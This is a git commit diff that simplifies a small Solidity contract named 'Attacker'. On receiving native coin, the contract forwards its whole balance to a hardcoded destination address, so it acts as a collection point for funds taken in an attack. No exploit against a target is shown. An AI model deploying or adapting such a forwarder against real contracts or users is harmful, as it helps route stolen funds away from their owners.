fdf9462f5e1d18a9b8d1f62e3e56a391031ce42c
Anonymous Person <xjfkf323@gmail.com>
2026-03-15 08:21:16 +0530

    Update Attacker.sol

--- Attacker.sol
+++ Attacker.sol
@@ -2,14 +2,10 @@
 pragma solidity ^0.8.0;
 
 contract Attacker {
-
     address public constant DESTINATION = 0x405f24B4C3C0DbEFbc2D333bABE8d73B99F7744b;
-    
-    receive() external payable {
 
-        if (address(this).balance > 0) {
-            (bool success,) = DESTINATION.call{value: address(this).balance}("");
-            require(success, "<NATIVE_BLOCKCHAIN_COIN_NAME> transfer failed");
-        }
+    receive() external payable {
+        (bool success,) = DESTINATION.call{value: address(this).balance}("");
+        require(success, "Transfer failed");
     }
 }
